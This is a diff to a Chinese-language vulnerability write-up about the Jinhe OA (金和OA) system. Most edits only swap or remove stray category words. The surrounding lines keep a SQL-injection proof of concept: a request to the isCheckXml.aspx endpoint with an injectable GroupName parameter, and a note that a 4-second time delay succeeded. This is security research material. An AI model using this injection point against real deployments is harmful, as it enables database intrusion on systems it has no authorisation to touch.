@@ -18,7 +18,7 @@ asset_dir: embedded-base64
 
 > app="金和网络-金和OA"
 >
-> 数据管理
+> 计算机服务器
 
 # 漏洞分析
 
@@ -65,14 +65,6 @@ public bool IsCheckName(string GroupName)
 
 # 漏洞复现
 
-深入探索
-
-计算机安全
-
-网络
-
-防病毒程序与恶意软件
-
 ```
 GET /c6/Jhsoft.Web.groups/isCheckXml.aspx/?GroupName=SQLI_POC&GroupID=1 HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -82,4 +74,4 @@ Host: jhsoft.mrxn.net
 
 成功延时 4 秒
 
-计算机服务器
+编程
